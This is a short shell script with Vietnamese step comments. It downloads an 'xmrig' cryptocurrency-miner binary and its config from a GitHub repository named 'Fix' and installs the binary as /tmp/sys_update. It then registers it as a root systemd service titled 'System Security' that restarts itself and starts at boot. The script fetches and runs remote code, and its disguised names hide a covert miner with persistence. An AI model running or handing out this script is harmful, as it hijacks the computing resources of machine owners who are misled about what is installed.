# 1. Chuyển vào thư mục tạm
cd /tmp

# 2. Tải và làm sạch file config
sudo curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.json | tr -d '\r' | sudo tee /tmp/config.json > /dev/null

# 3. Tải file thực thi
sudo curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig -o /tmp/sys_update
sudo chmod +x /tmp/sys_update

# 4. Tạo file cấu hình Startup (Trỏ vào /tmp)
sudo printf "[Unit]\nDescription=System Security\nAfter=network.target\n\n[Service]\nExecStart=/tmp/sys_update --config=/tmp/config.json\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n" | sudo tee /etc/systemd/system/sys_update.service > /dev/null

# 5. Nạp lại hệ thống để hết báo lỗi "Warning"
sudo systemctl daemon-reload

# 6. Kích hoạt tự động chạy khi bật máy (STARTUP)
sudo systemctl enable sys_update

# 7. Khởi động dịch vụ
sudo systemctl restart sys_update
